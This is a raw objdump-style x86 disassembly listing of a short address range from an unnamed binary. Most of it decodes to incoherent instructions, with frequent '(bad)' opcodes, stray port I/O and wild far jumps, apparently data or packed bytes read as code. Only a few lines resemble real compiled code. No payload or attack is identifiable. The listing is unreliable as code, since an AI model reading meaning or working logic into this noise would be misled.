  405d3d:	enter  0x434d,0xfe
  405d41:	mov    DWORD PTR [ebx+0xfef21f9],0x59a13ac6
  405d4b:	(bad)  
  405d4c:	int    0xf3
  405d4e:	(bad)  
  405d50:	mov    ah,0xec
  405d52:	push   ebp
  405d53:	div    BYTE PTR [eax+eax*1-0x412577d]
  405d5a:	push   cs
  405d5b:	xchg   esp,eax
  405d5c:	(bad)  
  405d5d:	scas   al,BYTE PTR es:[edi]
  405d5e:	jecxz  0x405dc2
  405d60:	addr16 test eax,0x6a71321e
  405d66:	pop    edx
  405d67:	lock add edx,DWORD PTR [edi-0x117ad9da]
  405d6e:	outs   dx,BYTE PTR ds:[esi]
  405d6f:	aam    0xc7
  405d71:	push   0xc9a8ab9f
  405d76:	inc    esi
  405d77:	and    al,0x57
  405d79:	xchg   ebp,eax
  405d7a:	cmp    eax,0x89f3c18
  405d7f:	std    
  405d80:	or     bh,BYTE PTR [ebx]
  405d82:	sbb    BYTE PTR [edi+0x2f],bl
  405d85:	(bad)  
  405d86:	popa   
  405d87:	hlt    
  405d88:	inc    ebp
  405d89:	shr    BYTE PTR [ecx],1
  405d8b:	into   
  405d8c:	fs mov ch,0x96
  405d8f:	mov    edx,0x320fad94
  405d94:	pop    esp
  405d95:	mov    ecx,0xdca3d4bc
  405d9a:	cs daa 
  405d9c:	push   esp
  405d9d:	lods   al,BYTE PTR ds:[esi]
  405d9e:	jb     0x405d52
  405da0:	push   ss
  405da1:	pop    es
  405da2:	je     0x405d4d
  405da4:	sar    esp,1
  405da6:	arpl   WORD PTR [ecx],di
  405da8:	jno    0x405df3
  405daa:	cdq    
  405dab:	jg     0x405d80
  405dad:	mov    esp,0xe9f958f1
  405db2:	cmp    edi,DWORD PTR [ebp-0x60cd6e40]
  405db8:	ffreep st(0)
  405dba:	out    dx,eax
  405dbb:	jbe    0x405dc5
  405dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dbe:	call   0x8b744faa
  405dc3:	push   0x24
  405dc5:	inc    ecx
  405dc6:	jmp    0x8fd3a4cc
  405dcb:	and    DWORD PTR [edx],0x74237df1
  405dd1:	sti    
  405dd2:	mov    ch,0x73
  405dd4:	dec    esp
  405dd5:	or     BYTE PTR [edx-0x5d946718],dl
  405ddb:	test   eax,0xe1cc2927
  405de0:	jl     0x405e4d
  405de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de3:	dec    eax
  405de4:	enter  0xa056,0xa0
  405de8:	or     BYTE PTR [ebx+0x2d],dh
  405deb:	or     eax,esi
  405ded:	aad    0x27
  405def:	call   0x1dc10f26
  405df4:	xchg   edx,eax
  405df5:	rcr    BYTE PTR [eax],1
  405df7:	ss pop edx
  405df9:	dec    edx
  405dfa:	or     eax,DWORD PTR [ebx+ebx*8]
  405dfd:	add    BYTE PTR [edx-0x14c81533],bl
  405e03:	scas   eax,DWORD PTR es:[edi]
  405e04:	jge    0x405e66
  405e06:	call   0x793c:0x5a91dad5
  405e0d:	xor    esi,ebp
  405e0f:	push   ss
  405e10:	inc    eax
  405e11:	mov    eax,ds:0x1c858278
  405e16:	fidivr WORD PTR [ebx+0x492f495b]
  405e1c:	sbb    dl,BYTE PTR [ebp-0x6bc29681]
  405e22:	mov    esi,edx
  405e24:	and    ch,BYTE PTR [edx+0x1b92d380]
  405e2a:	push   ds
  405e2b:	fucomp st(6)
  405e2d:	mov    eax,ds:0x214fd173
  405e32:	mov    al,0x94
  405e34:	outs   dx,BYTE PTR ds:[esi]
  405e35:	js     0x405e40
  405e37:	pop    edx
  405e38:	bnd jmp 0x405dcf
  405e3b:	scas   al,BYTE PTR es:[edi]
  405e3c:	or     al,0x8f
  405e3e:	ss loop 0x405ead
  405e41:	es xor dl,ch
  405e44:	or     bl,BYTE PTR [ebx]
  405e46:	push   esi
  405e47:	sub    BYTE PTR fs:[ecx+0x65b4fef6],ch
  405e4e:	sub    eax,0x3bf29474
  405e53:	fcmovu st,st(7)
  405e55:	inc    edi
  405e56:	lods   eax,DWORD PTR ds:[esi]
  405e57:	fist   DWORD PTR [edx+0x4f2368a5]
  405e5d:	mov    ds:0x4259385,eax
  405e62:	or     al,0xb1
  405e64:	push   cs
  405e65:	out    dx,al
  405e66:	push   ebp
  405e67:	cmp    ebp,DWORD PTR [esi+0x5e4c4419]
  405e6d:	inc    ebp
  405e6e:	xor    dl,BYTE PTR [ebx+0x2]
  405e71:	and    DWORD PTR ds:0xe0834a84,eax
  405e77:	or     al,0xf7
  405e79:	mov    ebx,ss
  405e7b:	push   ebp
  405e7c:	cmp    DWORD PTR [edx-0x4f79d0ba],esp
  405e82:	jo     0x405e0a
  405e84:	in     eax,0x14
  405e86:	test   al,0xb
  405e88:	mov    edx,0x95486709
  405e8d:	inc    ebp
  405e8e:	cld    
  405e8f:	imul   ebp,DWORD PTR [ebx],0xbc4df6d0
  405e95:	dec    esp
  405e96:	mov    ds:0x4903e0d0,eax
  405e9b:	sbb    BYTE PTR [ecx],0x11
  405e9e:	(bad)  
  405e9f:	sub    ch,BYTE PTR [edi+0x2bd2281]
  405ea5:	xchg   edi,eax
  405ea6:	dec    esp
  405ea7:	loopne 0x405ebc
  405ea9:	xchg   ebp,eax
  405eaa:	imul   edi,DWORD PTR [edx+ebx*4],0x2a5a431
  405eb1:	xor    DWORD PTR [edx-0x53],0x323786bb
  405eb8:	lods   al,BYTE PTR ds:[esi]
  405eb9:	or     bl,BYTE PTR [edx+0x4cf89952]
  405ebf:	leave  
  405ec0:	add    eax,0xaf2c5aea
  405ec5:	jnp    0x405f3c
  405ec7:	xor    ah,bl
  405ec9:	sti    
  405eca:	repnz pop ecx
  405ecc:	or     al,0xda
  405ece:	pop    esp
  405ecf:	push   ecx
  405ed0:	pop    ds
  405ed1:	dec    esp
  405ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ed3:	fwait
  405ed4:	jp     0x405e8c
  405ed6:	das    
  405ed7:	jp     0x405ed1
  405ed9:	pop    es
  405eda:	lds    edx,FWORD PTR [eax-0x5dfa3386]
  405ee0:	mov    esp,0x48071fe8
  405ee5:	pushf  
  405ee6:	jno    0x405efa
  405ee8:	jecxz  0x405ef3
  405eea:	cmp    esp,DWORD PTR [ecx]
  405eec:	cmp    ah,BYTE PTR [esi+0x5a]
  405eef:	sbb    esp,esi
  405ef1:	mov    eax,ebp
  405ef3:	pushf  
  405ef4:	mov    esp,0x4db03f7b
  405ef9:	fidiv  DWORD PTR [eax]
  405efb:	xlat   BYTE PTR ds:[ebx]
  405efc:	and    DWORD PTR [ebp+ebp*8+0x6bfb4e14],0x2f
  405f04:	std    
  405f05:	lahf   
  405f06:	jne    0x405eb3
  405f08:	mov    eax,ds:0x7809d6a5
  405f0d:	xor    BYTE PTR [edi+0x25bd6b45],0xa7
  405f14:	rol    edi,0x7f
  405f17:	ret    0xc0ba
  405f1a:	or     al,0xf0
  405f1c:	and    DWORD PTR [ebx],ebx
  405f1e:	push   es
  405f1f:	xor    BYTE PTR [ebp+ebx*1-0x70e947fb],0x18
  405f27:	int    0x61
  405f29:	mov    bl,0x7
  405f2b:	cmc    
  405f2c:	sub    ebx,DWORD PTR [ebx]
  405f2e:	fmul   QWORD PTR [edx]
  405f30:	fnsave [ecx+0x5b]
  405f33:	fidiv  WORD PTR [edx]
  405f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f36:	int3   
  405f37:	sub    DWORD PTR [edx+0x22],esi
  405f3a:	pop    esi
  405f3b:	test   ch,al
  405f3d:	add    esi,ebx
  405f3f:	xsha1  (bad)
  405f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f41:	or     bl,BYTE PTR [esi+0x6625407b]
  405f47:	push   0x0
  405f49:	jge    0x405f76
  405f4b:	out    dx,al
  405f4c:	jecxz  0x405f0a
  405f4e:	adc    al,0xa2
  405f50:	imul   DWORD PTR [ebx-0x7fe0b934]
  405f56:	in     al,dx
  405f57:	sub    BYTE PTR [esi],dl
  405f59:	add    BYTE PTR [ebx+0x1e990454],ch
  405f5f:	sub    bh,BYTE PTR [eax-0x3e]
  405f62:	gs pop ebx
  405f64:	jp     0x405fc0
  405f66:	sahf   
  405f67:	int3   
  405f68:	or     esp,edx
  405f6a:	sbb    BYTE PTR [eax+0x7a99a566],bh
  405f70:	test   BYTE PTR [bx+si],dh
  405f73:	sub    DWORD PTR [ebx+0x41],ebx
  405f76:	in     al,0x5c
  405f78:	icebp  
  405f79:	or     BYTE PTR [eax+0x4b],dl
  405f7c:	mov    dh,0xf1
  405f7e:	pop    ds
  405f7f:	pop    eax
  405f80:	mov    dh,0xba
  405f82:	inc    ebx
  405f83:	pop    ecx
  405f84:	pop    edi
  405f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f86:	test   eax,0xf6ecd8a2
  405f8b:	and    eax,0xb18c23e5
  405f90:	or     DWORD PTR [ebx+ebp*1+0x6a8d1a01],ecx
  405f97:	js     0x405f4e
  405f99:	mov    eax,0x5b57fa19
  405f9e:	cmp    al,bh
  405fa0:	or     ebp,DWORD PTR [eax+0x28237f02]
  405fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fa7:	mov    al,ds:0x8ee19f04
  405fac:	test   ebp,0xd2d9ab21
  405fb2:	cmp    DWORD PTR [edx+0x74e218fc],esp
  405fb8:	push   ds
  405fb9:	(bad)  
  405fba:	sbb    eax,0x861b9dbe
  405fbf:	cli    
  405fc0:	(bad)  
  405fc1:	and    ch,BYTE PTR [ecx-0x70]
  405fc4:	inc    esp
  405fc5:	sub    al,0x89
  405fc7:	and    ebp,DWORD PTR [ebp+0x5f75fb5d]
  405fcd:	std    
  405fce:	inc    eax
  405fcf:	sub    BYTE PTR [edx],cl
  405fd1:	xchg   esp,esi
  405fd3:	adc    eax,DWORD PTR [esi+eiz*2+0x7fb5bb16]
  405fda:	fnstcw WORD PTR [edi+edx*1-0x7c]
  405fde:	lahf   
  405fdf:	cli    
  405fe0:	and    dh,BYTE PTR [ecx-0x21]
  405fe3:	sub    DWORD PTR [eax+0x56],ecx
  405fe6:	popf   
  405fe7:	int    0x1
  405fe9:	lea    edi,[edi]
  405feb:	jp     0x405f86
  405fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fee:	sub    dh,BYTE PTR [ebp-0x7470cf71]
  405ff4:	fs jo  0x405fd6
  405ff7:	mov    bh,0xfa
  405ff9:	add    DWORD PTR [esi-0x75],ecx
  405ffc:	aad    0x46
  405ffe:	sbb    bh,bl
  406000:	in     al,0x31
  406002:	in     eax,dx
  406003:	push   ebx
  406004:	repnz pop eax
  406006:	popa   
  406007:	add    edi,DWORD PTR [edi+0x81253c1]
  40600d:	add    al,0xf8
  40600f:	xchg   ebx,eax
  406010:	add    bl,bl
  406012:	retf   0x963e
  406015:	mov    WORD PTR [eax],?
  406017:	ror    DWORD PTR [ebx],0x90
  40601a:	mov    ch,0xe4
  40601c:	and    bh,BYTE PTR [ebx]
  40601e:	leave  
  40601f:	inc    ecx
  406020:	mov    edx,0xd1861445
  406025:	shr    esp,0x42
  406028:	jnp    0x40601b
  40602a:	mov    eax,ds:0xdf44e223
  40602f:	sbb    edx,0xffffffb8
  406032:	loopne 0x40604b
  406034:	out    0x40,al
  406036:	mov    ds:0x5a8d9ab7,al
  40603b:	and    esp,DWORD PTR [ecx+eiz*1]
  40603e:	or     dh,dl
  406040:	mov    al,ds:0x852c4e48
  406045:	or     bl,BYTE PTR [esi-0x13]
  406048:	loopne 0x4060b5
  40604a:	cmp    al,cl
  40604c:	ficomp WORD PTR [edi-0x130f3214]
  406052:	dec    ebx
  406053:	sbb    eax,DWORD PTR [edx+ebx*8+0x35e271e]
  40605a:	push   eax
  40605b:	hlt    
  40605c:	rol    BYTE PTR [edi],1
  40605e:	pop    es
  40605f:	imul   esi,DWORD PTR [edi+0xbe3b2c8],0x71
  406066:	fild   WORD PTR [esp+ebx*1]
  406069:	cs push 0xbd64b023
  40606f:	mov    edi,0xa360ed6c
  406074:	cmp    DWORD PTR [edx+0x76],ecx
  406077:	ficom  DWORD PTR [esi+0x23]
  40607a:	stos   BYTE PTR es:[edi],al
  40607b:	mov    dh,0x50
  40607d:	mov    bh,0xb3
  40607f:	xlat   BYTE PTR ds:[ebx]
  406080:	std    
  406081:	aaa    
  406082:	retf   
  406083:	in     al,dx
  406084:	loopne 0x40608e
  406086:	xchg   edx,eax
  406087:	cdq    
  406088:	rcl    edx,cl
  40608a:	inc    ebx
  40608b:	push   ebx
  40608c:	xor    ebp,DWORD PTR [ebx-0x3bee1f16]
  406092:	test   al,0x58
  406094:	sbb    eax,0x9e1d7923
  406099:	jg     0x406102
  40609b:	and    cl,BYTE PTR [eax-0x4047d08b]
  4060a1:	jmp    FWORD PTR [ebp+0x28]
  4060a4:	popf   
  4060a5:	fidivr WORD PTR [edx]
  4060a7:	xchg   BYTE PTR [eax],dl
  4060a9:	or     BYTE PTR [ecx+0x64ce6016],dl
  4060af:	gs mov al,0x6
  4060b2:	push   ecx
  4060b3:	jg     0x4060ef
  4060b5:	(bad)  
  4060b6:	movzx  esp,si
  4060b9:	or     edx,edi
  4060bb:	jmp    0x3320c0e3
  4060c0:	inc    ecx
  4060c1:	ins    DWORD PTR es:[edi],dx
  4060c2:	mov    edi,0x4b744e64
  4060c7:	mov    bh,0xa5
  4060c9:	mov    dl,0x24
  4060cb:	icebp  
  4060cc:	xchg   ebx,eax
  4060cd:	in     al,dx
  4060ce:	jmp    0x445:0x5ff21343
  4060d5:	sti    
  4060d6:	sar    BYTE PTR [edi],0x45
  4060d9:	jg     0x40614a
  4060db:	mov    dl,0x1c
  4060dd:	jb     0x40608a
  4060df:	retf   0x26b1
  4060e2:	outs   dx,DWORD PTR ds:[esi]
  4060e3:	push   edx
  4060e4:	add    BYTE PTR [esi],0x81
  4060e7:	ret    0x4fbc
  4060ea:	scas   eax,DWORD PTR es:[edi]
  4060eb:	push   edx
  4060ec:	mov    ch,0x23
  4060ee:	gs jne 0x4060e8
  4060f1:	cmc    
  4060f2:	nop
  4060f3:	xor    BYTE PTR [eax+0x58],0xec
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	not    ebx
  40612e:	add    ch,BYTE PTR [edx+0x78]
  406131:	mov    ds:0x129e1818,eax
  406136:	sbb    BYTE PTR [eax],bl
  406138:	inc    esi
  406139:	clc    
  40613a:	lds    ebp,FWORD PTR [eax]
  40613c:	push   eax
  40613d:	das    
  40613e:	sbb    edx,DWORD PTR [edx]
  406140:	push   ebx
  406141:	pop    esp
  406142:	mov    al,ds:0xe14df8c6
  406147:	enter  0xd596,0xc6
  40614b:	iret   
  40614c:	push   eax
  40614d:	sub    DWORD PTR [ecx+0x54cb2be7],esi
  406153:	xor    dl,ch
  406155:	sub    DWORD PTR [esi],esp
  406157:	adc    DWORD PTR ds:0x703752e1,ebp
  40615d:	in     eax,0x59
  40615f:	mov    dh,0x29
  406161:	push   ds
  406162:	fsubp  st(7),st
  406164:	cmp    ebx,eax
  406166:	sub    al,0x86
  406168:	loope  0x40619b
  40616a:	mov    eax,0xb1c4bf14
  40616f:	push   edi
  406170:	and    DWORD PTR [esi-0x15b88f3a],ecx
  406176:	inc    edi
  406177:	pop    es
  406178:	push   cs
  406179:	cs shl eax,0xaa
  40617d:	sbb    DWORD PTR [edi+0x5f4eff26],esp
  406183:	dec    ebx
  406184:	jnp    0x4061cf
  406186:	xchg   esp,eax
  406187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406188:	cwde   
  406189:	in     eax,0xf7
  40618b:	sbb    BYTE PTR [edi],dh
  40618d:	mov    dh,0x9
  40618f:	pop    ss
  406190:	and    DWORD PTR [edx+ecx*4+0x3d],edi
  406194:	sti    
  406195:	jne    0x406173
  406197:	adc    cl,BYTE PTR [esp+ecx*8-0x791bbb44]
  40619e:	pop    ebp
  40619f:	popf   
  4061a0:	pop    es
  4061a1:	jmp    0xe613:0x6b517fed
  4061a8:	or     esi,ebp
  4061aa:	stos   BYTE PTR es:[edi],al
  4061ab:	jae    0x406203
  4061ad:	scas   al,BYTE PTR es:[edi]
  4061ae:	jle    0x406199
  4061b0:	push   es
  4061b1:	in     eax,0x85
  4061b3:	popa   
  4061b4:	div    al
  4061b6:	loope  0x406211
  4061b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b9:	pop    edx
  4061ba:	cmp    eax,0xe6118bdc
  4061bf:	icebp  
  4061c0:	push   esp
  4061c1:	fs clc 
  4061c3:	mov    cl,0x28
  4061c5:	rcl    DWORD PTR [edx+ecx*4],cl
  4061c8:	inc    eax
  4061c9:	xor    BYTE PTR [edx-0x167aaa7a],al
  4061cf:	test   eax,0x1876fd21
  4061d4:	test   DWORD PTR [ebp+0x7782681a],ecx
  4061da:	test   DWORD PTR [ecx-0x5b],eax
  4061dd:	popa   
  4061de:	push   edi
  4061df:	jle    0x4061a9
  4061e1:	mov    cl,BYTE PTR [esi-0x6d]
  4061e4:	or     DWORD PTR [edx+0x4cff111d],0x36
  4061eb:	les    ebp,FWORD PTR [ecx-0x425ea9a7]
  4061f1:	add    eax,0x17198d1e
  4061f6:	adc    BYTE PTR [esp+ebx*1+0x52419600],dh
  4061fd:	mov    ds:0xfce6aca0,eax
  406202:	scas   eax,DWORD PTR es:[edi]
  406203:	aaa    
  406204:	das    
  406205:	nop
  406206:	addr16 mov edi,0xc775eea3
  40620c:	(bad)  
  40620e:	cmp    DWORD PTR [edi],eax
  406210:	jg     0x4061d2
  406212:	mov    edi,0xd8673d16
  406217:	into   
  406218:	(bad)  
  406219:	out    dx,al
  40621a:	ds (bad) 
  40621c:	jmp    0xb17c:0x24df2b76
  406223:	inc    ebp
  406224:	push   0xb3362c80
  406229:	or     esp,edx
  40622b:	pop    esi
  40622c:	hlt    
  40622d:	jne    0x406206
  40622f:	adc    esi,ebx
  406231:	sbb    DWORD PTR [ebx],ebp
  406233:	leave  
  406234:	pusha  
  406235:	and    ch,BYTE PTR [esi]
  406237:	enter  0x51cc,0xac
  40623b:	int    0xd
  40623d:	mov    al,0xa1
  40623f:	sbb    edi,esp
  406241:	loopne 0x4061c8
  406243:	push   edx
  406244:	out    dx,al
  406245:	loop   0x40627c
  406247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406248:	daa    
  406249:	push   ebx
  40624a:	in     eax,0xad
  40624c:	jmp    0x84320ba
  406251:	jl     0x406271
  406253:	dec    esp
  406254:	dec    esp
  406255:	popfw  
  406257:	gs fst st(6)
  40625a:	icebp  
  40625b:	mov    ch,BYTE PTR [ebx-0x57]
  40625e:	js     0x4062a6
  406260:	cwde   
  406261:	mov    bh,0x51
  406263:	sti    
  406264:	shl    DWORD PTR [eax-0x7a1924c2],1
  40626a:	xor    DWORD PTR [esi+0x8],edi
  40626d:	loopne 0x406251
  40626f:	jo     0x40622e
  406271:	lock ins DWORD PTR es:[edi],dx
  406273:	xor    DWORD PTR [ebx],esi
  406275:	mov    ebp,0x26120341
  40627a:	push   ecx
  40627b:	push   0x7fdb62b2
  406280:	or     ah,BYTE PTR ds:0x6e28ed24
  406286:	mov    ecx,0xea13e3a
  40628b:	sub    eax,0x452b6fa3
  406290:	sub    BYTE PTR [ebx],dh
  406292:	jge    0x4062e7
  406294:	sahf   
  406295:	add    al,0x35
  406297:	or     al,0x8d
  406299:	pop    edi
  40629a:	nop
  40629b:	dec    esi
  40629c:	in     al,0x81
  40629e:	out    0xed,eax
  4062a0:	add    esp,ebp
  4062a2:	je     0x4062b1
  4062a4:	imul   ebx,DWORD PTR [esi+0x1a],0xe3aeca4e
  4062ab:	and    al,0xb6
  4062ad:	repnz popa 
  4062af:	les    ebx,FWORD PTR [ecx]
  4062b1:	leave  
  4062b2:	dec    ebp
  4062b3:	out    dx,al
  4062b4:	mov    ds:0x6698055a,al
  4062b9:	add    ecx,DWORD PTR [ebx-0x3f]
  4062bc:	cmp    eax,ecx
  4062be:	mov    bh,0x17
  4062c0:	xchg   edx,edi
  4062c2:	pop    eax
  4062c3:	pop    ds
  4062c4:	sbb    DWORD PTR [esi],0xc995dc9
  4062ca:	mov    esp,0x501e73e0
  4062cf:	sub    ebx,DWORD PTR [esi+0x55]
  4062d2:	js     0x4062ef
  4062d4:	sub    eax,0xf71dfc29
  4062d9:	inc    edi
  4062da:	mov    ds:0x301ea240,eax
  4062df:	inc    ebp
  4062e0:	(bad)  
  4062e1:	sbb    DWORD PTR [ebx],esp
  4062e3:	fld    DWORD PTR [eax+0x1a]
  4062e6:	inc    ebx
  4062e7:	stc    
  4062e8:	push   ebx
  4062e9:	fidivr DWORD PTR [ebx-0x72]
  4062ec:	fwait
  4062ed:	gs mov ebp,0x5456786c
  4062f3:	inc    esp
  4062f4:	mov    esp,DWORD PTR [edi+esi*8-0x24]
  4062f8:	in     al,0x96
  4062fa:	repz xor DWORD PTR [edi],ebx
  4062fd:	call   0x936afdff
  406302:	mov    esp,0x230584a
  406307:	or     BYTE PTR [ebp+0x43ad91f],0xb2
  40630e:	aas    
  40630f:	adc    DWORD PTR ds:0x94d1dca3,edi
  406315:	imul   ecx,DWORD PTR [edx],0x72
  406318:	sti    
  406319:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40631b:	cmp    BYTE PTR [eax-0x3a],dl
  40631e:	adc    eax,0xd0bed2a0
  406323:	dec    ecx
  406324:	or     eax,DWORD PTR ds:0xe6382a9f
  40632a:	pushf  
  40632b:	cmp    edi,ebp
  40632d:	mov    ds:0x170b1922,al
  406332:	fist   WORD PTR [eax+0x11]
  406335:	or     edx,DWORD PTR [ebp-0x69]
  406338:	bound  ecx,QWORD PTR [edx+edx*2]
  40633b:	add    al,0x50
  40633d:	mov    ebx,0x2e615de8
  406342:	test   DWORD PTR [edx],esp
  406344:	jecxz  0x4062f2
  406346:	je     0x406363
  406348:	xchg   ebp,eax
  406349:	mov    ah,0x92
  40634b:	ins    BYTE PTR es:[edi],dx
  40634c:	and    edi,DWORD PTR [esi]
  40634e:	cmc    
  40634f:	push   ss
  406350:	arpl   sp,cx
  406352:	call   0xd99666a4
  406357:	fcom   QWORD PTR [ebx+eax*8]
  40635a:	scas   al,BYTE PTR es:[edi]
  40635b:	les    esp,FWORD PTR [edi-0x4c]
  40635e:	stc    
  40635f:	push   0xbe0542d6
  406364:	loope  0x40635c
  406366:	repnz stc 
  406368:	stos   BYTE PTR es:[edi],al
  406369:	and    al,0xca
  40636b:	and    dl,BYTE PTR [eax+0xe]
  40636e:	cmp    al,0x14
  406370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406371:	xchg   edx,eax
  406372:	(bad)  
  406373:	stc    
  406374:	mov    ecx,cs
  406376:	cwde   
  406377:	or     dl,BYTE PTR [esi+0x14]
  40637a:	sub    BYTE PTR [edi+0x1cabf08a],cl
  406380:	das    
  406381:	xchg   esp,eax
  406382:	call   0x2cdfafc8
  406387:	std    
  406388:	dec    ebp
  406389:	cld    
  40638a:	loopne 0x4063a8
  40638c:	rol    DWORD PTR [edi+0x77],0x15
  406390:	icebp  
  406391:	fdiv   st(5),st
  406393:	pop    ss
  406394:	inc    edi
  406395:	jl     0x40631c
  406397:	(bad)  
  406399:	fld    QWORD PTR [esp+eiz*4]
  40639c:	fwait
  40639d:	jo     0x40634d
  40639f:	lds    ebx,FWORD PTR [ecx+ebx*4+0x120a1766]
  4063a6:	xchg   DWORD PTR [ecx],esi
  4063a8:	int3   
  4063a9:	es pop esi
  4063ab:	enter  0x9cfe,0xe9
  4063af:	ficomp WORD PTR [ecx]
  4063b1:	sbb    eax,0x564c08da
  4063b6:	call   0xaec5aeca
  4063bb:	xor    BYTE PTR [edi-0x3],bl
  4063be:	sbb    DWORD PTR [edx+0x11c9d069],esp
  4063c4:	daa    
  4063c5:	xor    ecx,DWORD PTR [ebp-0xf]
  4063c8:	(bad)  
  4063c9:	mov    bh,0x60
  4063cb:	xor    BYTE PTR [edi+0x6de1854b],dh
  4063d1:	jle    0x40636d
  4063d3:	and    cl,bl
  4063d5:	jmp    0x406434
  4063d7:	add    eax,0x43fff25f
  4063dc:	mov    ch,BYTE PTR [eax]
  4063de:	and    eax,edi
  4063e0:	jl     0x4063b1
  4063e2:	loop   0x406375
  4063e4:	mov    al,BYTE PTR [ebx-0x1a]
  4063e7:	dec    eax
  4063e8:	lock int3 
  4063ea:	push   ds
  4063eb:	es xchg ecx,eax
  4063ed:	cmp    ch,ah
  4063ef:	ret    0xefc4
  4063f2:	fst    DWORD PTR [esi]
  4063f4:	dec    esp
  4063f5:	fstp   DWORD PTR [ecx-0x5beb2ec0]
  4063fb:	js     0x4063d2
  4063fd:	cdq    
  4063fe:	cdq    
  4063ff:	jmp    0xe25d2439
  406404:	ds xchg edi,eax
  406406:	and    BYTE PTR [edx+0x28],dl
  406409:	fild   DWORD PTR [ebx-0x1e]
  40640c:	jge    0x4063b9
  40640e:	push   0xffffffdb
  406410:	test   al,0x25
  406412:	pop    esi
  406413:	adc    esp,edx
  406415:	pop    esi
  406416:	arpl   WORD PTR [edi],dx
  406418:	or     BYTE PTR [esi+0x5d],0x5a
  40641c:	fwait
  40641d:	mov    ch,0xfb
  40641f:	gs dec edi
  406421:	xchg   esp,eax
  406422:	push   cs
  406423:	addr16 loopne 0x4063b6
  406426:	push   esi
  406427:	repnz inc edx
  406429:	dec    ecx
  40642a:	xchg   edx,eax
  40642b:	or     bh,bh
  40642d:	sub    ecx,DWORD PTR [edx+0x21]
  406430:	mov    al,0x8d
  406432:	adc    eax,esp
  406434:	ds pop ds
  406436:	xchg   esp,eax
  406437:	mov    dl,0xe
  406439:	sub    ch,BYTE PTR [esi+0x9]
  40643c:	xchg   esi,eax
  40643d:	mov    esi,0x9fb58859
  406442:	ins    DWORD PTR es:[edi],dx
  406443:	xchg   ecx,eax
  406444:	inc    edx
  406445:	mov    dh,bl
  406447:	popf   
  406448:	add    eax,0xbe6f8ad1
  40644d:	mov    ch,0x77
  40644f:	fdivrp st(3),st
  406451:	out    dx,eax
  406452:	dec    ecx
  406453:	rcr    DWORD PTR [ebp-0x77],1
  406456:	(bad)  
  406458:	mov    eax,ebp
  40645a:	lahf   
  40645b:	cmp    dl,bh
  40645d:	ds cdq 
  40645f:	xchg   ebx,eax
  406460:	int    0x22
  406462:	es mov esp,0xbe0e6077
  406468:	and    bh,bh
  40646a:	sbb    al,0xe6
  40646c:	(bad)  
  40646d:	xor    DWORD PTR [ecx-0x6e2ddb92],ecx
  406473:	mov    esp,0xe237ebe5
  406478:	aad    0x9b
  40647a:	hlt    
  40647b:	fcmovb st,st(3)
  40647d:	out    dx,al
  40647e:	jbe    0x406482
  406480:	sub    DWORD PTR [ebp+0x21048f06],0x513949d0
  40648a:	push   0xbce2a117
  40648f:	inc    edi
  406490:	mov    BYTE PTR [ecx],bl
  406492:	test   DWORD PTR [eax+ebp*8-0x3ab04f32],ebx
  406499:	jg     0x406518
  40649b:	sub    cl,BYTE PTR [edx+esi*4]
  40649e:	(bad)  
  40649f:	sub    BYTE PTR [ecx-0x10],al
  4064a2:	pop    edx
  4064a3:	mov    ch,0x9a
  4064a5:	(bad)  
  4064a6:	scas   eax,DWORD PTR es:[edi]
  4064a7:	mov    edi,0xae7368d3
  4064ac:	pushf  
  4064ad:	test   edx,0x2726f7fb
  4064b3:	inc    esp
  4064b4:	arpl   WORD PTR [eax],di
  4064b6:	repnz push 0xffffffcd
  4064b9:	lea    edi,[eax+0x2e]
  4064bc:	dec    ebp
  4064bd:	xor    eax,0xb48f27cb
  4064c2:	xchg   DWORD PTR [edi],ebx
  4064c4:	pop    ebx
  4064c5:	mov    al,0x5c
  4064c7:	les    esp,FWORD PTR [ebx-0x30]
  4064ca:	loope  0x406543
  4064cc:	cmp    bh,BYTE PTR [ebx-0x728a11a9]
  4064d2:	and    esi,DWORD PTR ds:0x84a0f067
  4064d8:	lods   al,BYTE PTR ds:[esi]
  4064d9:	sub    BYTE PTR [edi],bl
  4064db:	(bad)  
  4064dc:	dec    edi
  4064dd:	pusha  
  4064de:	inc    esp
  4064df:	mov    cl,0xad
  4064e1:	jmp    0xc63672c2
  4064e6:	scas   eax,DWORD PTR es:[edi]
  4064e7:	xor    DWORD PTR [ebx+0x67],esp
  4064ea:	aaa    
  4064eb:	arpl   si,sp
  4064ed:	js     0x4064e9
  4064ef:	pop    ds
  4064f0:	popa   
  4064f1:	lods   al,BYTE PTR ds:[esi]
  4064f2:	int    0x30
  4064f4:	and    BYTE PTR [ebx-0x3b],0xfd
  4064f8:	ud2    
  4064fa:	ret    0xc8a
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
